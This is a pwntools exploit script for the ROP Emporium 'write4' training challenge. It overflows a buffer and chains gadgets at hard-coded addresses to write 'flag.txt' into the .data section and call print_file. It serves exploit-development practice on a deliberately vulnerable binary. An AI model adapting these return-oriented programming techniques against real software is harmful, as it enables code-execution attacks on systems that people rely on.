from pwn import *



# a nice w/w/w function retrieved from: https://www.rootnetsec.com/ropemporium-write4/
def place_string_at_address(mov_gadget_address, pop_gadget_address, string_address, string):

     # We have to remember that the length of the string has to be
     # divisibe by eight to make the padding in payload correct.
     while len(string) % 8 != 0:
          string += "\x00"

     splitted_string = [string[i:i + 8] for i in range(0, len(string), 8)]
     payload = b""
     for i in range(len(splitted_string)):
        
          # Place the gadgets into the payload.
          payload += p64(pop_gadget_address)
          payload += p64(string_address + (i * 8)) # We have to increment address in order
                                                   # to not overwrite previous strings.

          payload += str.encode(splitted_string[i])
          payload += p64(mov_gadget_address)

     return payload

#load = place_string_at_address(0x0000000000400628, 0x400628, 0x00601028, 'cat flag.txt')


junk = b"\x41" * 40
POP_R14_R15_RET = 0x400690
POP_RDI_RET = 0x400693
WHERE = 0x00601028  # where we want to store 'flag.txt\x00' - this is in the .data section
                    # readelf -a write4
                    # readelf -x .data write4
MOVE = 0x400628     # moves r15 -> [r14]
PRINT_FILE = 0x400510

write = p64(POP_R14_R15_RET) + p64(WHERE) + b"flag.txt" 
     # to write more than 8 bytes, increment the WHERE by 8 bytes and
     # don't forget to call MOVE!
     # p64(MOVE) + p64(POP_R14_R15_RET) + p64(WHERE + 8) + b".txt\x00\x00\x00\x00"

execute = [MOVE, POP_RDI_RET, WHERE, PRINT_FILE]
execute = b"".join([p64(r) for r in execute])
rop_chain = junk + write + execute

p = process("./write4")
p.recvuntil(">")
p.send(rop_chain)
p.interactive()